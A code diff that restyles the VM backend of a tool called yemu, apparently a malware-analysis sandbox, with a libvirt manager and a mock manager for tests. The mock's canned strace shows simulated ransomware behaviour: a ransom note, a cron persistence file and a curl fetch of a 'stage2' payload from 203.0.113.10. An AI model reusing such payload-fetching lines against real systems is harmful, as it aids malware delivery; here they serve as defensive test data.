@@ -1,11 +1,10 @@
-import logging
 import asyncio
-import os
-import subprocess
-import json
 import base64
-import tempfile
+import json
+import os
 import shutil
+import subprocess
+import tempfile
 
 from yemu.core.vm_backend import VMBackend
 
@@ -14,8 +13,10 @@ try:
 except ImportError:
     libvirt = None
 
+
 class VMManager(VMBackend):
     """libvirt / QEMU-KVM backend (Linux hosts)."""
+
     name = "libvirt"
 
     def __init__(self, ui_callback=None):
@@ -171,6 +172,7 @@ class VMManager(VMBackend):
 
     async def define_vm(self, spec):
         from yemu.core.vm_provisioner import VMProvisioner
+
         xml = VMProvisioner.render_libvirt_xml(spec)
         conn = self._get_conn()
         self._remove_existing_domain(spec.name)
@@ -183,6 +185,7 @@ class VMManager(VMBackend):
 
     async def switch_network(self, vm_name, from_network, to_network):
         import xml.etree.ElementTree as ET
+
         dom = self._get_domain(vm_name)
         if not dom:
             return False
@@ -328,8 +331,8 @@ class VMManager(VMBackend):
                 "arguments": {
                     "path": shell,
                     "arg": ["/c" if "cmd" in shell else "-c", command],
-                    "capture-output": True
-                }
+                    "capture-output": True,
+                },
             }
             cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(exec_args)]
             proc = await asyncio.create_subprocess_exec(
@@ -360,10 +363,7 @@ class VMManager(VMBackend):
                 self.logger.error(f"Unexpected response: {resp}")
                 return ""
             pid = resp['return']['pid']
-            status_args = {
-                "execute": "guest-exec-status",
-                "arguments": {"pid": pid}
-            }
+            status_args = {"execute": "guest-exec-status", "arguments": {"pid": pid}}
             for _ in range(60):
                 await asyncio.sleep(1)
                 cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(status_args)]
@@ -414,6 +414,7 @@ class VMManager(VMBackend):
     async def find_internet_facing_networks(self, vm_name):
         """Return names of libvirt networks attached to vm_name that forward traffic off-host."""
         import xml.etree.ElementTree as ET
+
         dom = self._get_domain(vm_name)
         if not dom:
             return []
@@ -446,7 +447,7 @@ class VMManager(VMBackend):
             return True
         except libvirt.libvirtError as e:
             self.logger.error(f"Failed to revert to snapshot {snapshot_name}: {e}")
-            raise RuntimeError(f"Failed to revert to snapshot: {e}")
+            raise RuntimeError(f"Failed to revert to snapshot: {e}") from e
 
     async def open_gui(self, vm_name):
         self.logger.info(f"Opening GUI for {vm_name}")
@@ -472,12 +473,11 @@ class VMManager(VMBackend):
 
         try:
             # 1. Open file
-            open_args = {
-                "execute": "guest-file-open",
-                "arguments": {"path": guest_path, "mode": "wb"}
-            }
+            open_args = {"execute": "guest-file-open", "arguments": {"path": guest_path, "mode": "wb"}}
             cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(open_args)]
-            proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            proc = await asyncio.create_subprocess_exec(
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            )
             stdout, stderr = await proc.communicate()
             if proc.returncode != 0:
                 self.logger.error(f"guest-file-open failed: {stderr.decode()}")
@@ -493,23 +493,19 @@ class VMManager(VMBackend):
                         break
                     write_args = {
                         "execute": "guest-file-write",
-                        "arguments": {
-                            "handle": handle,
-                            "buf-b64": base64.b64encode(chunk).decode()
-                        }
+                        "arguments": {"handle": handle, "buf-b64": base64.b64encode(chunk).decode()},
                     }
                     cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(write_args)]
-                    proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                    proc = await asyncio.create_subprocess_exec(
+                        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+                    )
                     stdout, stderr = await proc.communicate()
                     if proc.returncode != 0:
                         self.logger.error(f"guest-file-write failed: {stderr.decode()}")
                         return False
 
             # 3. Close file
-            close_args = {
-                "execute": "guest-file-close",
-                "arguments": {"handle": handle}
-            }
+            close_args = {"execute": "guest-file-close", "arguments": {"handle": handle}}
             cmd = ["virsh", "qemu-agent-command", vm_name, json.dumps(close_args)]
             await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
 
@@ -546,8 +542,10 @@ class VMManager(VMBackend):
             self.logger.error(f"Pull failed: {e}")
             return False
 
+
 class MockVMManager(VMBackend):
     """Canned responses so the UI, CLI and tests run without virtualization."""
+
     name = "mock"
 
     def list_vms(self):
@@ -590,11 +588,11 @@ class MockVMManager(VMBackend):
             '10:00:00.000900 openat(AT_FDCWD, "/tmp/DECRYPT_FILES.txt", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4',
             '10:00:00.001100 openat(AT_FDCWD, "/etc/cron.d/updater", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 5',
             '10:00:00.001200 vfork() = 1240',
-            '10:00:00.003000 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
+            '10:00:00.003000 connect(5, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',  # noqa: E501 (verbatim strace)
         ],
         "strace.1240": [
-            '10:00:00.001300 execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.10/stage2"], 0x7ffd1 /* 9 vars */) = 0',
-            '10:00:00.001800 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',
+            '10:00:00.001300 execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.10/stage2"], 0x7ffd1 /* 9 vars */) = 0',  # noqa: E501 (verbatim strace)
+            '10:00:00.001800 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("203.0.113.10")}, 16) = -1 ENETUNREACH',  # noqa: E501 (verbatim strace)
         ],
     }
 
@@ -603,6 +601,7 @@ class MockVMManager(VMBackend):
 
     async def run_command(self, vm_name, command, shell="/bin/sh"):
         import shlex
+
         if command.startswith("ls -1 "):
             return "\n".join(["rules.yarc", "sample", *self.MOCK_STRACE])
         if command.startswith("cat ") and "/strace." in command:
@@ -613,12 +612,14 @@ class MockVMManager(VMBackend):
         if command == "command -v yara":
             return "/usr/bin/yara"
         if "strace" in command:
-            return "execve('/bin/ls', ['ls'], 0x7ffd989c8d30) = 0\nopenat(AT_FDCWD, '.', O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3"
+            return "execve('/bin/ls', ['ls'], 0x7ffd989c8d30) = 0\nopenat(AT_FDCWD, '.', O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3"  # noqa: E501 (verbatim strace)
         if "yara -C" in command:
             pid = command.rsplit(" ", 2)[-2] if command.endswith("2>/dev/null") else command.split()[-1]
             if pid == "1234":
-                return ('suspicious_process [description="Matched a suspicious pattern in memory",author="YEMU"] 1234\n'
-                        '0x10000:$s1: 58 50 45 4e 44 41 54 41\n0x10500:$s2: malicious_function_name')
+                return (
+                    'suspicious_process [description="Matched a suspicious pattern in memory",author="YEMU"] 1234\n'
+                    '0x10000:$s1: 58 50 45 4e 44 41 54 41\n0x10500:$s2: malicious_function_name'
+                )
             return ""
         if "yara" in command and "/proc" in command:
             return """
@@ -631,13 +632,19 @@ author: "YEMU"
 packer_match [packer] /proc/5678/mem
 0x20000:$p1: UPX!
 """
-        if "cat /proc/1234/comm" in command: return "suspicious.elf"
-        if "readlink -f /proc/1234/exe" in command: return "/tmp/suspicious.elf"
-        if "cat /proc/1234/cmdline" in command: return "/tmp/suspicious.elf --payload"
+        if "cat /proc/1234/comm" in command:
+            return "suspicious.elf"
+        if "readlink -f /proc/1234/exe" in command:
+            return "/tmp/suspicious.elf"
+        if "cat /proc/1234/cmdline" in command:
+            return "/tmp/suspicious.elf --payload"
 
-        if "cat /proc/5678/comm" in command: return "loader"
-        if "readlink -f /proc/5678/exe" in command: return "/usr/bin/loader"
-        if "cat /proc/5678/cmdline" in command: return "/usr/bin/loader -d"
+        if "cat /proc/5678/comm" in command:
+            return "loader"
+        if "readlink -f /proc/5678/exe" in command:
+            return "/usr/bin/loader"
+        if "cat /proc/5678/cmdline" in command:
+            return "/usr/bin/loader -d"
 
         return "mock output"
 
